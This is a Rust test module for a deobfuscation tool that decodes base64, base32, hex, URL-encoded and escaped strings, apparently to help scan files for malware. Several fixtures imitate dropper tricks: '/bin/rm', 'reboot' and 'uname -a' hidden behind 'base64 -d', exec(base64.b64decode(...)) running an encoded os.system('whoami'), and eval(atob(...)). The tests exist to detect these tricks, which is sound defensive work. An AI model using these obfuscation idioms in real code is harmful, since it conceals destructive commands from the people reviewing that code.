        // classified UrlEncoded rather than Url. It must not produce a payload.
        let url = ExtractedString {
            value:
                "x = \"https://sourceware.org/gdb.html#:~:text=Function%3A%20to_string%20(self)\""
                    .to_string(),
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::UrlEncoded),
            ..Default::default()
        };
        assert!(decode_url_string(&url).is_none());
        assert!(decode_url_strings(std::slice::from_ref(&url)).is_empty());

        // But a URL that percent-encodes alphanumerics (obfuscation) is decoded.
        let obfuscated = ExtractedString {
            value: "https://evil.example/?d=%75%6e%61%6d%65%20-a".to_string(), // uname -a
            ..url.clone()
        };
        assert!(decode_url_string(&obfuscated).is_some());
    }

    #[test]
    fn test_unicode_escape_decode() {
        let input = ExtractedString {
            value: "\\x48\\x65\\x6c\\x6c\\x6f".to_string(), // "Hello"
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::UnicodeEscaped),
            ..Default::default()
        };

        let result = decode_unicode_escape_string(&input).unwrap();
        assert_eq!(result.value, "Hello");
        assert_eq!(result.method, StringMethod::UnicodeEscapeDecode);
    }

    #[test]
    fn test_is_likely_base64() {
        assert!(is_likely_base64("SGVsbG8gV29ybGQhCg=="));
        assert!(!is_likely_base64("not base64!"));
        assert!(!is_likely_base64("short"));
    }

    #[test]
    fn test_is_likely_hex() {
        assert!(is_likely_hex("48656c6c6f20576f726c6421"));
        assert!(!is_likely_hex("not hex!"));
        assert!(!is_likely_hex("48656c6c6f2")); // odd length
    }

    #[test]
    fn test_base32_decode() {
        let input = ExtractedString {
            value: "JBSWY3DPEBLW64TMMQ======".to_string(), // "Hello World"
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::Base32),
            ..Default::default()
        };

        let result = decode_base32_string(&input).unwrap();
        assert_eq!(result.value, "Hello World");
        assert_eq!(result.method, StringMethod::Base32Decode);
    }

    #[test]
    fn test_base32_decode_nopad() {
        let input = ExtractedString {
            value: "JBSWY3DPEBLW64TMMQ".to_string(), // "Hello World" without padding
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::Base32),
            ..Default::default()
        };

        let result = decode_base32_string(&input).unwrap();
        assert_eq!(result.value, "Hello World");
        assert_eq!(result.method, StringMethod::Base32Decode);
    }

    #[test]
    fn test_base32_decode_long() {
        // Test with actual long base32 strings from real use
        let input = ExtractedString {
            value: "KRUGS4ZANFZSAYJAONSWG4TFOQQG2ZLTONQWOZJAMZXXEIDUMVZXI2LOM4======".to_string(),
            data_offset: 0,
            method: StringMethod::RawScan,
            kind: Some(StringKind::Base32),
            ..Default::default()
        };

        let result = decode_base32_string(&input).unwrap();
        assert_eq!(result.value, "This is a secret message for testing");
        assert_eq!(result.method, StringMethod::Base32Decode);
    }

    #[test]
    fn test_base85_decode() {
        // Test with a simple known base85 string
        // We'll test the raw decoder function directly
        let decoded = decode_ascii85("9jqo^").unwrap();
        // 9jqo^ decodes to "Man " in ASCII85
        assert_eq!(decoded, b"Man ");
    }

    #[test]
    fn test_ascii85_decode_with_z() {
        // Test 'z' shorthand for four zero bytes
        let decoded = decode_ascii85("z").unwrap();
        assert_eq!(decoded, vec![0u8; 4]);
    }

    #[test]
    fn test_ascii85_decode_with_delimiters() {
        // Test that delimiters are properly skipped
        let decoded = decode_ascii85("<~9jqo^~>").unwrap();
        assert_eq!(decoded, b"Man ");
    }

    #[test]
    fn test_is_likely_base32() {
        assert!(is_likely_base32("JBSWY3DPEBLW64TMMQ======"));
        assert!(is_likely_base32("MFRGG3DFMZTWQ2LK"));
        assert!(!is_likely_base32("not base32!"));
        assert!(!is_likely_base32("short"));
        assert!(!is_likely_base32("ABCDEFGHIJKLMNOP")); // no digits 2-7
    }

    #[test]
    fn test_is_likely_base85() {
        // Plain text should not be detected as base85 (even if it has valid chars)
        assert!(!is_likely_base85("not base85!"));
        assert!(!is_likely_base85("short"));
        assert!(!is_likely_base85("library/alloc/src/raw_vec/mod.rs"));
        assert!(!is_likely_base85("operation not supported"));
        assert!(!is_likely_base85("Apple Certification Authority1"));

        // Note: With quality heuristic, even delimited strings need to decode to
        // significantly better text quality to be accepted
    }

    fn make_string(value: &str, kind: Option<StringKind>) -> ExtractedString {
        ExtractedString {
            value: value.to_string(),
            data_offset: 0,
            data_len: 0,
            method: StringMethod::RawScan,
            kind,
            fragments: None,
        }
    }

    #[test]
    fn test_deobfuscate_concatenation_javascript() {
        let input = r#""SGVsbG8g" + "V29ybGQhCg==""#;
        assert_eq!(
            deobfuscate_concatenation(input),
            Some("SGVsbG8gV29ybGQhCg==".to_string())
        );
    }

    #[test]
    fn test_deobfuscate_concatenation_python() {
        let input = r#"'SGVsbG8g' + 'V29ybGQhCg==""#;
        assert_eq!(
            deobfuscate_concatenation(input),
            Some("SGVsbG8gV29ybGQhCg==".to_string())
        );
    }

    #[test]
    fn test_deobfuscate_concatenation_php() {
        let input = r#"'SGVsbG8g' . 'V29ybGQhCg==""#;
        assert_eq!(
            deobfuscate_concatenation(input),
            Some("SGVsbG8gV29ybGQhCg==".to_string())
        );
    }

    #[test]
    fn test_deobfuscate_concatenation_no_pattern() {
        assert_eq!(deobfuscate_concatenation("simple_string_no_concat"), None);
    }

    #[test]
    fn test_deobfuscate_concatenation_too_short() {
        assert_eq!(deobfuscate_concatenation(r#""ab" + "cd""#), None);
    }

    #[test]
    fn test_decode_base64_strings_batch() {
        let inputs = vec![
            make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64)),
            make_string("VGVzdCBEYXRhISE=", Some(StringKind::Base64)),
            make_string("not_base64", None),
        ];
        let results = decode_base64_strings(&inputs);
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].value, "Hello World!");
        assert_eq!(results[0].method, StringMethod::Base64Decode);
        assert_eq!(results[1].value, "Test Data!!");
    }

    #[test]
    fn test_decode_base64_strings_with_concatenation() {
        let inputs = vec![make_string(r#""SGVsbG8g" + "V29ybGQh""#, None)];
        let results = decode_base64_strings(&inputs);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].value, "Hello World!");
        assert_eq!(results[0].method, StringMethod::Base64Decode);
    }

    #[test]
    fn test_decode_base64_empty() {
        assert!(decode_base64_strings(&[]).is_empty());
    }

    #[test]
    fn test_base64_too_short() {
        assert!(decode_base64_strings(&[make_string("SGVs", Some(StringKind::Base64))]).is_empty());
    }

    #[test]
    fn test_base64_whitespace_trimming() {
        let results = decode_base64_strings(&[make_string(
            "  SGVsbG8gV29ybGQh  ",
            Some(StringKind::Base64),
        )]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].value, "Hello World!");
    }

    #[test]
    fn test_decode_hex_strings_batch() {
        let inputs = vec![
            make_string("48656c6c6f20576f726c6421", Some(StringKind::HexEncoded)),
            make_string("54657374204461746121", Some(StringKind::HexEncoded)),
            make_string("not_hex", None),
        ];
        let results = decode_hex_strings(&inputs);
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].value, "Hello World!");
        assert_eq!(results[0].method, StringMethod::HexDecode);
        assert_eq!(results[1].value, "Test Data!");
    }

    #[test]
    fn test_hex_odd_length() {
        assert!(
            decode_hex_strings(&[make_string(
                "48656c6c6f20576f726c642",
                Some(StringKind::HexEncoded)
            )])
            .is_empty()
        );
    }

    #[test]
    fn test_hex_uppercase() {
        let results = decode_hex_strings(&[make_string(
            "48656C6C6F20576F726C6421",
            Some(StringKind::HexEncoded),
        )]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].value, "Hello World!");
    }

    #[test]
    fn test_decode_url_strings_batch() {
        let inputs = vec![
            make_string("Hello%20World%21", Some(StringKind::UrlEncoded)),
            make_string("Test%20Data%21%21", Some(StringKind::UrlEncoded)),
            make_string("no_encoding", None),
        ];
        let results = decode_url_strings(&inputs);
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].value, "Hello World!");
        assert_eq!(results[0].method, StringMethod::UrlDecode);
        assert_eq!(results[1].value, "Test Data!!");
    }

    #[test]
    fn test_url_special_chars() {
        let results = decode_url_strings(&[make_string(
            "path%2Fto%2Ffile%3Fquery%3Dvalue%26foo%3Dbar",
            Some(StringKind::UrlEncoded),
        )]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].value, "path/to/file?query=value&foo=bar");
    }

    #[test]
    fn test_decode_unicode_escape_strings_batch() {
        let inputs = vec![
            make_string(
                "\\x48\\x65\\x6c\\x6c\\x6f",
                Some(StringKind::UnicodeEscaped),
            ),
            make_string(
                "\\u0054\\u0065\\u0073\\u0074",
                Some(StringKind::UnicodeEscaped),
            ),
            make_string("no_escapes", None),
        ];
        let results = decode_unicode_escape_strings(&inputs);
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].value, "Hello");
        assert_eq!(results[0].method, StringMethod::UnicodeEscapeDecode);
        assert_eq!(results[1].value, "Test");
    }

    #[test]
    fn test_decode_base32_strings_batch() {
        let inputs = vec![
            make_string("JBSWY3DPEBLW64TMMQ======", Some(StringKind::Base32)),
            make_string("not_base32", None),
        ];
        let results = decode_base32_strings(&inputs);
        assert!(!results.is_empty());
        assert_eq!(results[0].value, "Hello World");
        assert_eq!(results[0].method, StringMethod::Base32Decode);
    }

    #[test]
    fn test_base32_too_short() {
        assert!(
            decode_base32_strings(&[make_string("JBSWY3DP", Some(StringKind::Base32))]).is_empty()
        );
    }

    #[test]
    fn test_base85_with_whitespace() {
        if let Some(decoded) = try_decode_ascii85("<~9jqo^\n  \t~>") {
            assert_eq!(decoded, b"Man ");
        }
    }

    #[test]
    fn test_base85_z_shorthand() {
        if let Some(decoded) = try_decode_ascii85("z") {
            assert_eq!(decoded, vec![0u8; 4]);
        }
    }

    #[test]
    fn test_base85_invalid_char() {
        assert!(try_decode_ascii85("9jqo^~invalid~").is_none());
    }

    #[test]
    fn test_base85_overflow_protection() {
        assert!(try_decode_ascii85("uuuuu").is_none());
    }

    #[test]
    fn test_decoded_ip_classification() {
        let results = decode_hex_strings(&[make_string(
            "3139322e3136382e312e31",
            Some(StringKind::HexEncoded),
        )]);
        if !results.is_empty() {
            assert_eq!(results[0].value, "192.168.1.1");
            assert_eq!(results[0].kind, Some(StringKind::IP));
        }
    }

    #[test]
    fn test_base64_reject_identifier_false_positives() {
        // These are .NET interface/class names that look like base64 but decode to garbage
        // The input (readable identifier) should be considered higher quality than
        // the decoded output (binary garbage)
        let false_positives = [
            "IWorkItemQueriesExt2",
            "IWorkItemMyFavoritesExt2",
            "IVsImageService2",
            "IVsPersistHierarchyItem2",
            "QueryDefinition2",
            "IVsRunningDocumentTable3",
            "QueryItem2Collection",
            "QueryFolder2ContentsChangedEventArgs",
        ];

        for input in false_positives {
            let result = decode_base64_strings(&[make_string(input, None)]);
            assert!(
                result.is_empty(),
                "Should reject '{}' as false positive base64",
                input
            );
        }
    }

    // Tests for extract_embedded_base64

    #[test]
    fn test_extract_embedded_base64_python_style() {
        // Python: exec(base64.b64decode('SGVsbG8gV29ybGQh'))
        let input = make_string("exec(base64.b64decode('SGVsbG8gV29ybGQh'))", None);
        let results = extract_embedded_base64(&[input]);
        assert_eq!(results.len(), 1, "Should extract one embedded base64");
        assert_eq!(results[0].value, "Hello World!");
        assert_eq!(results[0].method, StringMethod::Base64Decode);
    }

    #[test]
    fn test_extract_embedded_base64_shell_style() {
        // Shell: echo SGVsbG8gV29ybGQh | base64 -d
        let input = make_string(
            "echo SGVsbG8gV29ybGQh | base64 -d",
            Some(StringKind::ShellCmd),
        );
        let results = extract_embedded_base64(&[input]);
        assert_eq!(results.len(), 1, "Should extract one embedded base64");
        assert_eq!(results[0].value, "Hello World!");
    }

    #[test]
    fn test_extract_embedded_base64_short_decode_command() {
        // gentoo-systemd's obfuscated `configure` and kin: a short base64 hidden
        // behind `base64 -d`/`--decode`/`-D`. Too short for the general floor,
        // but the command vouches for it — including the *unpadded* `reboot`,
        // which has no `=` to lean on. `/bin/rm` and `uname -a` are the other
        // primitives a dropper hides this way.
        for (line, plain) in [
            ("meson=${meson:-`base64 -d <<< L2Jpbi9ybQo=`}", "/bin/rm"),
            ("x=$(base64 --decode <<< dW5hbWUgLWE=)", "uname -a"),
            ("printf %s L2Jpbi9ybQ== | base64 -D", "/bin/rm"),
            ("base64 -d <<< cmVib290", "reboot"), // unpadded — command is the only signal
        ] {
            let results = extract_embedded_base64(&[make_string(line, None)]);
            assert!(
                results.iter().any(|r| r.value == plain),
                "{line:?} should decode {plain:?}, got {:?}",
                results.iter().map(|r| &r.value).collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn test_extract_embedded_base64_padded_short_run() {
        // Padding is base64's own tell and almost never follows an identifier,
        // so a padded short run decodes on that signal alone — no command
        // needed. Both are too short (10–11 alnum) for the old fixed floor.
        for (line, plain) in [
            ("x := \"L2Jpbi9ybQ==\"", "/bin/rm"),
            ("arg=dW5hbWUgLWE=", "uname -a"),
        ] {
            let results = extract_embedded_base64(&[make_string(line, None)]);
            assert!(
                results.iter().any(|r| r.value == plain),
                "{line:?} should decode {plain:?}, got {:?}",
                results.iter().map(|r| &r.value).collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn test_extract_embedded_base64_unpadded_short_needs_a_signal() {
        // `reboot` → `cmVib290` is 8 alnum with no padding: no signal on its
        // own, so a bare occurrence is ignored. This is what keeps the lower
        // floor from turning ordinary 8-char tokens into noise.
        let results = extract_embedded_base64(&[make_string("tag=cmVib290;", None)]);
        assert!(
            results.iter().all(|r| r.value != "reboot"),
            "unpadded short run without padding or a decode command must not be extracted"
        );
    }

    #[test]
    fn test_extract_embedded_base64_javascript_atob() {
        // JavaScript: eval(atob('SGVsbG8gV29ybGQh'))
        let input = make_string("eval(atob('SGVsbG8gV29ybGQh'))", None);
        let results = extract_embedded_base64(&[input]);
        assert_eq!(results.len(), 1, "Should extract one embedded base64");
        assert_eq!(results[0].value, "Hello World!");
    }

    #[test]
    fn test_extract_embedded_base64_skips_whole_string() {
        // If the entire string is base64, it should be skipped (handled by decode_base64_strings)
        let input = make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64));
        let results = extract_embedded_base64(&[input]);
        assert!(
            results.is_empty(),
            "Should skip strings that are entirely base64"
        );
    }

    #[test]
    fn test_extract_embedded_base64_requires_valid_length() {
        // Base64 must be multiple of 4
        let input = make_string("decode('SGVsbG9Xb3JsZA')", None); // 14 chars, not multiple of 4
        let results = extract_embedded_base64(&[input]);
        assert!(
            results.is_empty(),
            "Should reject base64 with invalid length"
        );
    }

    #[test]
    fn test_extract_embedded_base64_multiple_in_one_string() {
        // Multiple base64 strings in one line (must be >= 12 chars each to match regex)
        // "Hello World!" = SGVsbG8gV29ybGQh (16 chars)
        // "Test String!" = VGVzdCBTdHJpbmch (16 chars)
        let input = make_string("a = 'SGVsbG8gV29ybGQh'; b = 'VGVzdCBTdHJpbmch'", None);
        let results = extract_embedded_base64(&[input]);
        assert_eq!(
            results.len(),
            2,
            "Should extract both embedded base64 strings"
        );
    }

    #[test]
    fn test_extract_embedded_base64_nested_code() {
        // Nested Python code - common in malware
        // Inner: "import os; os.system('whoami')"
        let inner_b64 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp";
        let input = make_string(&format!("exec(base64.b64decode('{}'))", inner_b64), None);
        let results = extract_embedded_base64(&[input]);
        assert_eq!(results.len(), 1);
        assert!(results[0].value.contains("import os"));
        assert!(results[0].value.contains("whoami"));
    }

    #[test]
    fn test_extract_embedded_base64_rejects_short_decoded() {
        // Even if base64 is valid, decoded result must be >= 4 chars
        let input = make_string("decode('YWI=')", None); // decodes to "ab" (2 chars)
        let results = extract_embedded_base64(&[input]);
        assert!(
            results.is_empty(),
            "Should reject base64 that decodes to < 4 chars"
        );
    }

    #[test]
    fn test_extract_embedded_base64_locates_the_token() {
        let value = "exec(base64.b64decode('SGVsbG8gV29ybGQh'))";
        let token = "SGVsbG8gV29ybGQh";
        let token_pos = value.find(token).unwrap() as u64;
        let input = ExtractedString {
            value: value.to_string(),
            data_offset: 12345,
            method: StringMethod::RawScan,
            ..Default::default()
        };
        let results = extract_embedded_base64(&[input]);
        assert_eq!(results.len(), 1);
        // The decoded payload's source is the base64 token itself: its offset is
        // the token's position within the parent, and its extent is the encoded
        // token length — not the parent offset, and not the decoded length.
        assert_eq!(results[0].data_offset, 12345 + token_pos);
        assert_eq!(results[0].data_len as usize, token.len());
        assert_eq!(
            results[0].source_spans().collect::<Vec<_>>(),
            vec![(12345 + token_pos, token.len() as u64)]
        );
    }
}
